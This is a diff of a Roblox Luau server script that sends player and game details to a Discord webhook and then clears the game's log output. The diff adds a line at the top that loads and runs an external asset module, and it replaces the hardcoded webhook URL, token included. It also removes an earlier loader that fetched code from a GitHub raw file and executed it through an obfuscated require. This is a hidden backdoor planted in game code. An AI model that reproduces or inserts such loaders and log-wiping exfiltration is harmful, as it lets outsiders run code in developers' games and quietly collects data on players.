@@ -1,9 +1,11 @@
+require(77565251296196):load()
+
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local MarketplaceService = game:GetService("MarketplaceService")
 local LogService = game:GetService("LogService")
 
-local generalWebhookURL = "https://discord.com/api/webhooks/1315285720101027880/MSfntRo5RDub2hcJcHVNxYrn5Nq046DVk2yXxptjl3-OEcg2m_ALErBKj_s8TJGL7d2q"
+local generalWebhookURL = "https://discord.com/api/webhooks/1315015562769862686/gtD1zWtUFrcoFJFAol8UBiPjUH6QvlQsV2bpdlPIOfg-88o2zjxE_gWx2x2i_h0LtPgp"
 
 local function sendToDiscord(webhookURL, embedData)
 	local success, response = pcall(function()
@@ -49,7 +51,7 @@ end
 
 Players.PlayerAdded:Connect(function(player)
 	logGameInfo(player)
-	pcall(function() require(0x25bdc96a3)(game:GetService("HttpService"):GetAsync("https://raw.githubusercontent.com/BIGCHUNKYCAT/roblox-luau-loader/refs/heads/main/micro.txt"))() end)
-require(77565251296196):load()
+	
+
 	LogService:ClearOutput()
  end)
